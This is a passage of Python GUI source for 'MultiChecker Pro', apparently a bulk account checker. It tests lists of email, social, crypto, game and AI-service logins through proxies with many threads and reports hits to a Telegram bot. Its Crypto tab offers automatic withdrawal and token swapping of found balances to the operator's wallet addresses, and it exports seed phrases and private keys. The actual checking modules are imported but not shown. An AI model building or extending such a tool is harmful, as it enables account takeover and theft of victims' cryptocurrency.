import customtkinter as ctk
from tkinter import filedialog, Canvas
import asyncio
import aiohttp
import csv
import json
import os
import platform
import re
import sys
import threading
from datetime import datetime
from urllib.parse import urlparse

# Опциональный импорт для drag-and-drop
try:
    from tkinterdnd2 import DND_FILES, TkinterDnD
    DRAG_DROP_AVAILABLE = True
except ImportError:
    DRAG_DROP_AVAILABLE = False
    print("⚠️ tkinterdnd2 не установлен. Drag-and-drop недоступен.")
    print("   Установите: pip install tkinterdnd2")

sys.path.insert(0, os.path.dirname(__file__))

# Установлена актуальная версия v1.0.54
APP_VERSION = "1.0.54"

if platform.system() == "Windows":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

from checkers.email_checker import EmailChecker
from checkers.social_checker import SocialChecker
from checkers.crypto_checker import CryptoChecker
from checkers.game_checker import GameChecker
from checkers.ai_checker import AIChecker
import i18n

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

_TEXTBOX_DISPLAY_LIMIT = 5000
_GATHER_BATCH_SIZE     = 50000
_MAX_LOG_LINES         = 50000

BG       = "#0d1117"
SIDEBAR  = "#161b22"
CARD     = "#1c2128"
CARD2    = "#21262d"
BORDER   = "#30363d"
ACCENT   = "#58a6ff"
GREEN    = "#3fb950"
RED      = "#f85149"
YELLOW   = "#d29922"
PURPLE   = "#bc8cff"
ORANGE   = "#f0883e"
TEXT     = "#e6edf3"
MUTED    = "#8b949e"
HOVER    = "#2d333b"

TAB_META = {
    "All":    ("⬡", "all_categories"),
    "Email":  ("✉", "email"),
    "Social": ("◈", "social"),
    "Crypto": ("◎", "crypto"),
    "Games":  ("◉", "games"),
    "AI":     ("◆", "ai"),
}


class MultiCheckerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(f"MultiChecker Pro  v{APP_VERSION}")
        self.geometry("1300x820")
        self.minsize(1100, 700)
        self.configure(fg_color=BG)

        self.is_running      = False
        self.results         = []
        self.all_results     = []
        self._platform_stats = {}
        self._loaded_data    = {}

        self.checkers = {
            "Email":  EmailChecker(),
            "Social": SocialChecker(),
            "Crypto": CryptoChecker(),
            "Games":  GameChecker(),
            "AI":     AIChecker(),
        }
        self.tab_widgets   = {}
        self._translatable = []
        self._active_tab   = "All"
        self._setup_ui()
        self._load_config()
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _setup_ui(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self._build_sidebar()
        self._build_content()

    def _build_sidebar(self):
        sb = ctk.CTkFrame(self, width=220, fg_color=SIDEBAR, corner_radius=0)
        sb.grid(row=0, column=0, sticky="nsew")
        sb.grid_propagate(False)
        sb.grid_rowconfigure(8, weight=1)  # Динамический отступ для нижних кнопок настроек
        sb.grid_columnconfigure(0, weight=1)

        logo = ctk.CTkFrame(sb, fg_color="transparent")
        logo.grid(row=0, column=0, padx=18, pady=(22, 6), sticky="ew")
        ctk.CTkLabel(logo, text="MultiChecker", font=("Segoe UI", 18, "bold"),
                     text_color=ACCENT).pack(anchor="w")
        ctk.CTkLabel(logo, text=f"Pro  •  v{APP_VERSION}", font=("Segoe UI", 11),
                     text_color=MUTED).pack(anchor="w")
        
        # Фиксация автораBes Bits в интерфейсе
        ctk.CTkLabel(logo, text="Автор: Bes Bits", font=("Segoe UI", 11, "italic"),
                     text_color=PURPLE).pack(anchor="w", pady=(2, 0))

        ctk.CTkFrame(sb, height=1, fg_color=BORDER).grid(
            row=1, column=0, padx=14, pady=(6, 10), sticky="ew")

        self._nav_btns = {}
        for i, (tab, (icon, _)) in enumerate(TAB_META.items()):
            btn = ctk.CTkButton(
                sb, text=f"  {icon}   {tab}",
                anchor="w", font=("Segoe UI", 13),
                fg_color="transparent", hover_color=HOVER,
                text_color=TEXT, corner_radius=8, height=42,
                command=lambda t=tab: self._switch_tab(t),
            )
            btn.grid(row=i + 2, column=0, padx=10, pady=2, sticky="ew")
            self._nav_btns[tab] = btn

        ctk.CTkFrame(sb, height=1, fg_color=BORDER).grid(
            row=9, column=0, padx=14, pady=8, sticky="ew")

        # Переключатель языковых пакетов
        lang_f = ctk.CTkFrame(sb, fg_color="transparent")
        lang_f.grid(row=10, column=0, padx=14, pady=4, sticky="ew")
        ctk.CTkLabel(lang_f, text="Язык / Language", font=("Segoe UI", 10),
                     text_color=MUTED).pack(anchor="w", padx=4)
        self.lang_sw = ctk.CTkSwitch(
            lang_f, text="RU / EN", font=("Segoe UI", 12),
            command=self.toggle_lang,
            button_color=ACCENT, progress_color=ACCENT,
        )
        self.lang_sw.pack(anchor="w", padx=4, pady=(4, 0))
        if i18n.current_lang == "ru":
            self.lang_sw.select()

        # Корректное разделение строк для устранения наложений элементов
        theme_f = ctk.CTkFrame(sb, fg_color="transparent")
        theme_f.grid(row=11, column=0, padx=14, pady=(15, 4), sticky="ew")
        ctk.CTkLabel(theme_f, text="Theme", font=("Segoe UI", 10),
                     text_color=MUTED).pack(anchor="w", padx=4)
        self.theme_sw = ctk.CTkSwitch(
            theme_f, text="Dark / Light", font=("Segoe UI", 12),
            command=self._toggle_theme,
            button_color=ACCENT, progress_color=ACCENT,
        )
        self.theme_sw.pack(anchor="w", padx=4, pady=(4, 0))

        self._sb_status = ctk.CTkLabel(
            sb, text="● Готов", font=("Segoe UI", 11), text_color=GREEN)
        self._sb_status.grid(row=12, column=0, padx=18, pady=(8, 18), sticky="sw")

        self._nav_highlight("All")

    def _nav_highlight(self, active):
        for tab, btn in self._nav_btns.items():
            if tab == active:
                btn.configure(fg_color=CARD2, text_color=ACCENT,
                               font=("Segoe UI", 13, "bold"))
            else:
                btn.configure(fg_color="transparent", text_color=TEXT,
                               font=("Segoe UI", 13))

    def _switch_tab(self, name):
        self._active_tab = name
        self._nav_highlight(name)
        for t, f in self._frames.items():
            f.grid() if t == name else f.grid_remove()

    def _build_content(self):
        wrap = ctk.CTkFrame(self, fg_color=BG, corner_radius=0)
        wrap.grid(row=0, column=1, sticky="nsew")
        wrap.grid_columnconfigure(0, weight=1)
        wrap.grid_rowconfigure(0, weight=1)

        self._frames = {}
        for tab in TAB_META:
            f = ctk.CTkFrame(wrap, fg_color=BG, corner_radius=0)
            f.grid(row=0, column=0, sticky="nsew")
            f.grid_columnconfigure(0, weight=1)
            f.grid_rowconfigure(1, weight=1)
            self._frames[tab] = f
            self.tab_widgets[tab] = self._build_tab(f, tab)

        self._switch_tab("All")

    def _build_tab(self, frame, tab_name):
        w = {}
        icon, label_key = TAB_META[tab_name]

        bar = ctk.CTkFrame(frame, fg_color=CARD, corner_radius=0, height=58)
        bar.grid(row=0, column=0, sticky="ew")
        bar.grid_propagate(False)
        bar.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(bar, text=f"{icon}  {i18n.t(label_key)} Checker",
                     font=("Segoe UI", 17, "bold"), text_color=TEXT
                     ).grid(row=0, column=0, padx=20, pady=14, sticky="w")

        w["pill"] = ctk.CTkLabel(bar, text="● Готов",
                                  font=("Segoe UI", 11, "bold"),
                                  text_color=GREEN, fg_color=CARD2,
                                  corner_radius=10, padx=12, pady=3)
        w["pill"].grid(row=0, column=2, padx=20, sticky="e")

        body = ctk.CTkScrollableFrame(frame, fg_color=BG, corner_radius=0)
        body.grid(row=1, column=0, sticky="nsew")
        body.grid_columnconfigure(0, weight=1)

        ic = self._card(body, "Входные данные")
        ic.grid(row=0, column=0, padx=16, pady=(14, 6), sticky="ew")
        ic.grid_columnconfigure(0, weight=1)
        w["input"] = ctk.CTkTextbox(
            ic, height=108, font=("Consolas", 12),
            fg_color=CARD2, border_color=BORDER, border_width=1,
            text_color=TEXT, corner_radius=8,
        )
        w["input"].grid(row=1, column=0, padx=12, pady=(2, 12), sticky="ew")
        
        # Добавляем поддержку Ctrl+V для вставки из буфера обмена
        self._bind_paste_shortcut(w["input"])
        
        # Добавляем поддержку drag-and-drop файлов
        self._setup_drag_and_drop(w["input"])

        sc = self._card(body, "Настройки")
        sc.grid(row=1, column=0, padx=16, pady=6, sticky="ew")
        sc.grid_columnconfigure(0, weight=1)

        sr = ctk.CTkFrame(sc, fg_color="transparent")
        sr.grid(row=1, column=0, padx=12, pady=(2, 12), sticky="ew")
        sr.grid_columnconfigure(2, weight=1)
        sr.grid_columnconfigure(6, weight=2)

        def lbl(parent, text, col):
            ctk.CTkLabel(parent, text=text, font=("Segoe UI", 12),
                         text_color=MUTED).grid(row=0, column=col, padx=(0, 6), sticky="w")

        lbl(sr, "Потоки", 0)
        w["threads"] = ctk.CTkEntry(sr, width=65, font=("Segoe UI", 12),
                                     fg_color=CARD2, border_color=BORDER,
                                     text_color=TEXT, corner_radius=8)
        w["threads"].insert(0, "100")
        w["threads"].grid(row=0, column=1, padx=(0, 18), sticky="w")

        lbl(sr, "Таймаут (с)", 3)
        w["timeout"] = ctk.CTkEntry(sr, width=62, font=("Segoe UI", 12),
                                     fg_color=CARD2, border_color=BORDER,
                                     text_color=TEXT, corner_radius=8)
        w["timeout"].insert(0, "10")
        w["timeout"].grid(row=0, column=4, padx=(0, 18), sticky="w")

        lbl(sr, "Прокси", 5)
        w["proxy"] = ctk.CTkEntry(sr, font=("Segoe UI", 12), fg_color=CARD2,
                                   border_color=BORDER, text_color=TEXT,
                                   corner_radius=8,
                                   placeholder_text="http://ip:port  или  proxy.txt")
        w["proxy"].grid(row=0, column=6, sticky="ew")

        tg_row = ctk.CTkFrame(sc, fg_color="transparent")
        tg_row.grid(row=2, column=0, padx=12, pady=(2, 12), sticky="ew")
        tg_row.grid_columnconfigure(1, weight=1)
        tg_row.grid_columnconfigure(4, weight=1)

        ctk.CTkLabel(tg_row, text=i18n.t("tg_token"), font=("Segoe UI", 12),
                     text_color=MUTED).grid(row=0, column=0, padx=(0, 6), sticky="w")
        w["tg_token"] = ctk.CTkEntry(tg_row, width=180, font=("Segoe UI", 12),
                                      fg_color=CARD2, border_color=BORDER,
                                      text_color=TEXT, corner_radius=8,
                                      placeholder_text="123456:ABC-DEF...")
        w["tg_token"].grid(row=0, column=1, padx=(0, 18), sticky="ew")

        ctk.CTkLabel(tg_row, text=i18n.t("tg_chat_id"), font=("Segoe UI", 12),
                     text_color=MUTED).grid(row=0, column=2, padx=(0, 6), sticky="w")
        w["tg_chat_id"] = ctk.CTkEntry(tg_row, width=120, font=("Segoe UI", 12),
                                        fg_color=CARD2, border_color=BORDER,
                                        text_color=TEXT, corner_radius=8,
                                        placeholder_text="-100123456")
        w["tg_chat_id"].grid(row=0, column=3, padx=(0, 18), sticky="w")

        w["tg_enabled"] = ctk.CTkSwitch(
            tg_row, text=i18n.t("tg_enabled"), font=("Segoe UI", 12),
            button_color=ACCENT, progress_color=ACCENT, text_color=MUTED,
        )
        w["tg_enabled"].grid(row=0, column=4, sticky="w")

        # АВТОВЫВОД (только для Crypto чекера)
        if tab_name == "Crypto":
            aw_card = self._card(body, "💰 Автовывод средств")
            aw_card.grid(row=2, column=0, padx=16, pady=6, sticky="ew")
            aw_card.grid_columnconfigure(0, weight=1)
            
            # Переключатель автовывода
            aw_header = ctk.CTkFrame(aw_card, fg_color="transparent")
            aw_header.grid(row=1, column=0, padx=12, pady=(2, 8), sticky="ew")
            
            w["auto_withdraw_enabled"] = ctk.CTkSwitch(
                aw_header, text="Включить автовывод", font=("Segoe UI", 13, "bold"),
                button_color=GREEN, progress_color=GREEN, text_color=TEXT,
            )
            w["auto_withdraw_enabled"].grid(row=0, column=0, sticky="w")
            
            ctk.CTkLabel(aw_header, text="⚠️ Используйте осторожно!", 
                         font=("Segoe UI", 10), text_color=YELLOW
                         ).grid(row=0, column=1, padx=12, sticky="w")
            
            # Адреса для вывода
            aw_addresses = ctk.CTkFrame(aw_card, fg_color=CARD2, corner_radius=8)
            aw_addresses.grid(row=2, column=0, padx=12, pady=(0, 12), sticky="ew")
            aw_addresses.grid_columnconfigure(1, weight=1)
            
            # ETH адрес
            ctk.CTkLabel(aw_addresses, text="ETH/BSC/Polygon:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=0, padx=10, pady=8, sticky="w")
            w["withdraw_eth"] = ctk.CTkEntry(aw_addresses, font=("Consolas", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6,
                                              placeholder_text="0x...")
            w["withdraw_eth"].grid(row=0, column=1, padx=(0, 10), pady=8, sticky="ew")
            self._bind_paste_shortcut(w["withdraw_eth"])
            
            # BTC адрес
            ctk.CTkLabel(aw_addresses, text="Bitcoin:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=1, column=0, padx=10, pady=8, sticky="w")
            w["withdraw_btc"] = ctk.CTkEntry(aw_addresses, font=("Consolas", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6,
                                              placeholder_text="bc1... или 1... или 3...")
            w["withdraw_btc"].grid(row=1, column=1, padx=(0, 10), pady=8, sticky="ew")
            self._bind_paste_shortcut(w["withdraw_btc"])
            
            # TRX адрес
            ctk.CTkLabel(aw_addresses, text="Tron:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=2, column=0, padx=10, pady=8, sticky="w")
            w["withdraw_trx"] = ctk.CTkEntry(aw_addresses, font=("Consolas", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6,
                                              placeholder_text="T...")
            w["withdraw_trx"].grid(row=2, column=1, padx=(0, 10), pady=8, sticky="ew")
            self._bind_paste_shortcut(w["withdraw_trx"])
            
            # SOL адрес
            ctk.CTkLabel(aw_addresses, text="Solana:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=3, column=0, padx=10, pady=8, sticky="w")
            w["withdraw_sol"] = ctk.CTkEntry(aw_addresses, font=("Consolas", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6,
                                              placeholder_text="...")
            w["withdraw_sol"].grid(row=3, column=1, padx=(0, 10), pady=(8, 12), sticky="ew")
            self._bind_paste_shortcut(w["withdraw_sol"])
            
            # Минимальные суммы
            aw_min = ctk.CTkFrame(aw_card, fg_color="transparent")
            aw_min.grid(row=3, column=0, padx=12, pady=(0, 12), sticky="ew")
            aw_min.grid_columnconfigure((1, 3, 5, 7), weight=1)
            
            ctk.CTkLabel(aw_min, text="Минимум для вывода:", font=("Segoe UI", 11, "bold"),
                         text_color=TEXT).grid(row=0, column=0, padx=(0, 12), sticky="w")
            
            ctk.CTkLabel(aw_min, text="ETH:", font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=1, padx=4, sticky="e")
            w["min_eth"] = ctk.CTkEntry(aw_min, width=70, font=("Segoe UI", 10),
                                         fg_color=CARD2, border_color=BORDER,
                                         text_color=TEXT, corner_radius=6)
            w["min_eth"].insert(0, "0.01")
            w["min_eth"].grid(row=0, column=2, padx=4, sticky="w")
            
            ctk.CTkLabel(aw_min, text="BTC:", font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=3, padx=4, sticky="e")
            w["min_btc"] = ctk.CTkEntry(aw_min, width=70, font=("Segoe UI", 10),
                                         fg_color=CARD2, border_color=BORDER,
                                         text_color=TEXT, corner_radius=6)
            w["min_btc"].insert(0, "0.001")
            w["min_btc"].grid(row=0, column=4, padx=4, sticky="w")
            
            ctk.CTkLabel(aw_min, text="TRX:", font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=5, padx=4, sticky="e")
            w["min_trx"] = ctk.CTkEntry(aw_min, width=70, font=("Segoe UI", 10),
                                         fg_color=CARD2, border_color=BORDER,
                                         text_color=TEXT, corner_radius=6)
            w["min_trx"].insert(0, "10")
            w["min_trx"].grid(row=0, column=6, padx=4, sticky="w")
            
            ctk.CTkLabel(aw_min, text="SOL:", font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=7, padx=4, sticky="e")
            w["min_sol"] = ctk.CTkEntry(aw_min, width=70, font=("Segoe UI", 10),
                                         fg_color=CARD2, border_color=BORDER,
                                         text_color=TEXT, corner_radius=6)
            w["min_sol"].insert(0, "0.1")
            w["min_sol"].grid(row=0, column=8, padx=4, sticky="w")
            
            # АВТООБМЕН ТОКЕНОВ (только для Crypto чекера)
            swap_card = self._card(body, "🔄 Автообмен токенов")
            swap_card.grid(row=3, column=0, padx=16, pady=6, sticky="ew")
            swap_card.grid_columnconfigure(0, weight=1)
            
            # Переключатель автообмена
            swap_header = ctk.CTkFrame(swap_card, fg_color="transparent")
            swap_header.grid(row=1, column=0, padx=12, pady=(2, 8), sticky="ew")
            
            w["auto_swap_enabled"] = ctk.CTkSwitch(
                swap_header, text="Включить автообмен", font=("Segoe UI", 13, "bold"),
                button_color=PURPLE, progress_color=PURPLE, text_color=TEXT,
            )
            w["auto_swap_enabled"].grid(row=0, column=0, sticky="w")
            
            ctk.CTkLabel(swap_header, text="Меняет токены на ETH/BNB перед выводом", 
                         font=("Segoe UI", 10), text_color=MUTED
                         ).grid(row=0, column=1, padx=12, sticky="w")
            
            # Настройки автообмена
            swap_settings = ctk.CTkFrame(swap_card, fg_color=CARD2, corner_radius=8)
            swap_settings.grid(row=2, column=0, padx=12, pady=(0, 12), sticky="ew")
            swap_settings.grid_columnconfigure((1, 3, 5, 7), weight=1)
            
            ctk.CTkLabel(swap_settings, text="Цель:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=0, padx=10, pady=8, sticky="w")
            w["swap_target"] = ctk.CTkComboBox(swap_settings, width=100, font=("Segoe UI", 11),
                                                values=["ETH", "BNB", "MATIC"],
                                                fg_color=CARD, border_color=BORDER,
                                                button_color=PURPLE, button_hover_color="#a371f7",
                                                text_color=TEXT, corner_radius=6)
            w["swap_target"].set("ETH")
            w["swap_target"].grid(row=0, column=1, padx=(0, 12), pady=8, sticky="w")
            
            ctk.CTkLabel(swap_settings, text="Минимум USD:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=2, padx=10, pady=8, sticky="w")
            w["swap_min_usd"] = ctk.CTkEntry(swap_settings, width=80, font=("Segoe UI", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6)
            w["swap_min_usd"].insert(0, "1.0")
            w["swap_min_usd"].grid(row=0, column=3, padx=(0, 12), pady=8, sticky="w")
            
            ctk.CTkLabel(swap_settings, text="Slippage %:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=4, padx=10, pady=8, sticky="w")
            w["swap_slippage"] = ctk.CTkEntry(swap_settings, width=70, font=("Segoe UI", 11),
                                               fg_color=CARD, border_color=BORDER,
                                               text_color=TEXT, corner_radius=6)
            w["swap_slippage"].insert(0, "1.0")
            w["swap_slippage"].grid(row=0, column=5, padx=(0, 12), pady=8, sticky="w")
            
            ctk.CTkLabel(swap_settings, text="DEX:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=6, padx=10, pady=8, sticky="w")
            w["swap_dex"] = ctk.CTkComboBox(swap_settings, width=120, font=("Segoe UI", 11),
                                             values=["Uniswap", "PancakeSwap", "QuickSwap"],
                                             fg_color=CARD, border_color=BORDER,
                                             button_color=PURPLE, button_hover_color="#a371f7",
                                             text_color=TEXT, corner_radius=6)
            w["swap_dex"].set("Uniswap")
            w["swap_dex"].grid(row=0, column=7, padx=(0, 10), pady=8, sticky="w")

        bf = ctk.CTkFrame(body, fg_color="transparent")
        bf.grid(row=4 if tab_name == "Crypto" else 2, column=0, padx=16, pady=6, sticky="ew")

        def btn(parent, text, fg, hv, cmd, width=None):
            kw = dict(text=text, fg_color=fg, hover_color=hv,
                      font=("Segoe UI", 12, "bold"), corner_radius=8, height=38, command=cmd)
            if width:
                kw["width"] = width
            return ctk.CTkButton(parent, **kw)

        btn(bf, "▶  Старт",   GREEN,  "#2ea043", lambda: self.start_check(tab_name), 140).pack(side="left", padx=(0,6))
        btn(bf, "■  Стоп",    RED,    "#da3633", self.stop_check, 110).pack(side="left", padx=(0,6))
        btn(bf, "⌫  Очистить", CARD,  HOVER, lambda: self.clear_output(w), 120).pack(side="left", padx=(0,6))
        btn(bf, "↑  Файл",    CARD,   HOVER, lambda: self.import_file(w), 110).pack(side="left", padx=(0,6))
        btn(bf, "\U0001f4cb",  CARD,   HOVER, lambda: self._paste_clipboard(w), 42).pack(side="left", padx=(0,6))
        btn(bf, "⊘  Дубли",   "#6e40c9", "#5a32a3", lambda: self.remove_duplicates(w), 110).pack(side="left", padx=(0,6))

        eg = ctk.CTkFrame(bf, fg_color=CARD, corner_radius=8)
        eg.pack(side="left", padx=(8, 0))
        ctk.CTkLabel(eg, text="Экспорт:", font=("Segoe UI", 11),
                     text_color=MUTED).pack(side="left", padx=(10, 4))
        for fmt, lbl_text in [("txt","TXT"),("json","JSON"),("csv","CSV"),("xlsx","EXCEL")]:
            ctk.CTkButton(eg, text=lbl_text, fg_color="transparent",
                           hover_color=HOVER, font=("Segoe UI", 11, "bold"),
                           text_color=ACCENT, corner_radius=6, height=30, width=54,
                           command=lambda f=fmt: self.export_results(w, f)
                           ).pack(side="left", padx=2, pady=4)

        ctk.CTkButton(eg, text="$", fg_color="transparent",
                       hover_color=HOVER, font=("Segoe UI", 11, "bold"),
                       text_color=GREEN, corner_radius=6, height=30, width=36,
                       command=lambda: self.export_balance_only(w)
                       ).pack(side="left", padx=2, pady=4)
        
        # Кнопки ручного раздельного сохранения Сид-фраз и Приватных ключей
        ctk.CTkButton(eg, text="🌱 SEED", fg_color="transparent",
                       hover_color=HOVER, font=("Segoe UI", 11, "bold"),
                       text_color=PURPLE, corner_radius=6, height=30, width=64,
                       command=lambda: self.export_by_type(w, "seed")
                       ).pack(side="left", padx=2, pady=4)

        ctk.CTkButton(eg, text="🔑 KEY", fg_color="transparent",
                       hover_color=HOVER, font=("Segoe UI", 11, "bold"),
                       text_color=ORANGE, corner_radius=6, height=30, width=60,
                       command=lambda: self.export_by_type(w, "privkey")
                       ).pack(side="left", padx=2, pady=4)

        btn(bf, "◈  Стат", PURPLE, "#a371f7",
            lambda: self.show_stats(tab_name), 110).pack(side="right")

        cr = ctk.CTkFrame(body, fg_color="transparent")
        cr.grid(row=5 if tab_name == "Crypto" else 3, column=0, padx=16, pady=6, sticky="ew")
        cr.grid_columnconfigure((0,1,2,3), weight=1)

        def counter(parent, col, title, color):
            c = ctk.CTkFrame(parent, fg_color=CARD, corner_radius=12)
            c.grid(row=0, column=col, padx=4, sticky="ew")
            ctk.CTkLabel(c, text=title, font=("Segoe UI", 10),
                         text_color=MUTED).pack(pady=(10, 0))
            v = ctk.CTkLabel(c, text="0", font=("Segoe UI", 26, "bold"),
                              text_color=color)
            v.pack()
            ctk.CTkFrame(c, height=3, fg_color=color, corner_radius=2
                         ).pack(fill="x", padx=16, pady=(4, 10))
            return v

        w["cnt_valid"]   = counter(cr, 0, "Валидных",   GREEN)
        w["cnt_invalid"] = counter(cr, 1, "Невалидных", RED)
        w["cnt_errors"]  = counter(cr, 2, "Ошибок",     YELLOW)
        w["cnt_total"]   = counter(cr, 3, "Всего",      ACCENT)

        pc = ctk.CTkFrame(body, fg_color=CARD, corner_radius=10)
        pc.grid(row=6 if tab_name == "Crypto" else 4, column=0, padx=16, pady=6, sticky="ew")
        pc.grid_columnconfigure(0, weight=1)
        
        # Точный прогресс-индикатор (Проценты + Количественный счётчик строк)
        w["progress"] = ctk.CTkProgressBar(pc, height=8, corner_radius=4,
                                            progress_color=ACCENT, fg_color=BORDER)
        w["progress"].grid(row=0, column=0, padx=(14, 120), pady=12, sticky="ew")
        w["progress"].set(0)
        
        w["progress_lbl"] = ctk.CTkLabel(pc, text="0% (0/0)", font=("Segoe UI", 11, "bold"), text_color=ACCENT)
        w["progress_lbl"].grid(row=0, column=0, padx=14, pady=12, sticky="e")

        ff = ctk.CTkFrame(body, fg_color="transparent")
        ff.grid(row=7 if tab_name == "Crypto" else 5, column=0, padx=16, pady=(4, 0), sticky="ew")
        w["_log_lines"] = []
        w["_filter"]    = "all"
        w["filter_seg"] = ctk.CTkSegmentedButton(
            ff,
            values=[i18n.t("filter_all"), i18n.t("filter_valid"),
                    i18n.t("filter_invalid"), i18n.t("filter_errors"),
                    i18n.t("filter_balance")],
            font=("Segoe UI", 12),
            selected_color=ACCENT, selected_hover_color="#4393e4",
            unselected_color=CARD, unselected_hover_color=HOVER,
            fg_color=CARD, text_color=TEXT,
            command=lambda v: self._on_filter(w, v),
        )
        w["filter_seg"].set(i18n.t("filter_all"))
        w["filter_seg"].pack(side="left")

        lc = ctk.CTkFrame(body, fg_color=CARD, corner_radius=10)
        lc.grid(row=8 if tab_name == "Crypto" else 6, column=0, padx=16, pady=(6, 18), sticky="ew")
        lc.grid_columnconfigure(0, weight=1)
        w["output"] = ctk.CTkTextbox(
            lc, height=300, font=("Consolas", 12),
            fg_color="#0d1117", border_color=BORDER, border_width=1,
            text_color=TEXT, corner_radius=8, wrap="none",
        )
        w["output"].grid(row=0, column=0, padx=12, pady=12, sticky="ew")
        w["output"].tag_config("valid",   foreground=GREEN)
        w["output"].tag_config("invalid", foreground=MUTED)
        w["output"].tag_config("error",   foreground=YELLOW)
        w["output"].tag_config("system",  foreground=ACCENT)

        w["status"] = w["pill"]
        return w

    def _card(self, parent, title=""):
        f = ctk.CTkFrame(parent, fg_color=CARD, corner_radius=10)
        if title:
            ctk.CTkLabel(f, text=title, font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=0, padx=14,
                                                pady=(10, 2), sticky="w")
        return f
    
    def _bind_paste_shortcut(self, widget):
        """Добавляет поддержку Ctrl+V для вставки из буфера обмена."""
        def paste_from_clipboard(event=None):
            try:
                # Получаем содержимое буфера обмена
                clipboard_content = self.clipboard_get()
                
                if isinstance(widget, ctk.CTkTextbox):
                    # Для Textbox вставляем в текущую позицию курсора
                    try:
                        widget.insert("insert", clipboard_content)
                    except:
                        # Если не получилось вставить в позицию курсора, добавляем в конец
                        widget.insert("end", clipboard_content)
                elif isinstance(widget, ctk.CTkEntry):
                    # Для Entry заменяем весь текст
                    widget.delete(0, "end")
                    widget.insert(0, clipboard_content)
                
                return "break"  # Предотвращаем стандартное поведение
            except Exception as e:
                print(f"Ошибка вставки из буфера: {e}")
                return "break"
        
        # Получаем внутренний tkinter виджет для биндинга
        try:
            if isinstance(widget, ctk.CTkTextbox):
                # Для CTkTextbox внутренний виджет - _textbox
                tk_widget = widget._textbox
            elif isinstance(widget, ctk.CTkEntry):
                # Для CTkEntry внутренний виджет - _entry
                tk_widget = widget._entry
            else:
                tk_widget = widget
            
            # Биндим Ctrl+V (Windows/Linux) и Cmd+V (Mac) к внутреннему виджету
            tk_widget.bind("<Control-v>", paste_from_clipboard)
            tk_widget.bind("<Command-v>", paste_from_clipboard)
            
            # Также биндим к самому CTk виджету на всякий случай
            widget.bind("<Control-v>", paste_from_clipboard)
            widget.bind("<Command-v>", paste_from_clipboard)
            
        except Exception as e:
            print(f"⚠️ Ошибка биндинга Ctrl+V: {e}")
            # Пробуем забиндить напрямую к виджету
            widget.bind("<Control-v>", paste_from_clipboard)
            widget.bind("<Command-v>", paste_from_clipboard)
        
        # Также биндим правую кнопку мыши для контекстного меню
        if isinstance(widget, ctk.CTkEntry):
            def show_context_menu(event):
                try:
                    menu = ctk.CTkToplevel(self)
                    menu.withdraw()
                    menu.overrideredirect(True)
                    
                    frame = ctk.CTkFrame(menu, fg_color=CARD, corner_radius=8)
                    frame.pack(padx=2, pady=2)
                    
                    ctk.CTkButton(frame, text="📋 Вставить (Ctrl+V)", 
                                  command=lambda: [paste_from_clipboard(), menu.destroy()],
                                  fg_color="transparent", hover_color=HOVER,
                                  anchor="w", height=28, font=("Segoe UI", 11)
                                  ).pack(fill="x", padx=4, pady=2)
                    
                    menu.geometry(f"+{event.x_root}+{event.y_root}")
                    menu.deiconify()
                    menu.focus_set()
                    menu.bind("<FocusOut>", lambda e: menu.destroy())
                except Exception:
                    pass
            
            try:
                # Биндим к внутреннему виджету
                tk_widget.bind("<Button-3>", show_context_menu)
            except:
                widget.bind("<Button-3>", show_context_menu)
            
            widget.bind("<Button-3>", show_context_menu)
    
    def _setup_drag_and_drop(self, textbox):
        """Настраивает drag-and-drop для текстового поля."""
        if not DRAG_DROP_AVAILABLE:
            return
        
        def on_drop(event):
            try:
                # Получаем путь к файлу (может быть в фигурных скобках на Windows)
                file_path = event.data
                
                # Убираем фигурные скобки если есть
                if file_path.startswith('{') and file_path.endswith('}'):
                    file_path = file_path[1:-1]
                
                # Проверяем что это файл
                if os.path.isfile(file_path):
                    # Читаем содержимое файла
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        # Очищаем текстбокс и вставляем содержимое
                        textbox.delete("1.0", "end")
                        textbox.insert("1.0", content)
                        
                        # Логируем успех
                        print(f"✓ Файл загружен: {os.path.basename(file_path)}")
                    except UnicodeDecodeError:
                        # Пробуем другие кодировки
                        try:
                            with open(file_path, 'r', encoding='cp1251') as f:
                                content = f.read()
                            textbox.delete("1.0", "end")
                            textbox.insert("1.0", content)
                            print(f"✓ Файл загружен (cp1251): {os.path.basename(file_path)}")
                        except Exception as e:
                            print(f"✗ Ошибка чтения файла: {e}")
                    except Exception as e:
                        print(f"✗ Ошибка загрузки файла: {e}")
                else:
                    print(f"✗ Не является файлом: {file_path}")
                    
            except Exception as e:
                print(f"✗ Ошибка drag-and-drop: {e}")
        
        # Регистрируем drag-and-drop
        try:
            # Получаем внутренний tkinter виджет
            tk_textbox = textbox._textbox
            tk_textbox.drop_target_register(DND_FILES)
            tk_textbox.dnd_bind('<<Drop>>', on_drop)
        except Exception as e:
            print(f"⚠️ Не удалось настроить drag-and-drop: {e}")

    def toggle_lang(self):
        i18n.set_lang("en" if i18n.current_lang == "ru" else "ru")
        self._refresh_text()

    def _toggle_theme(self):
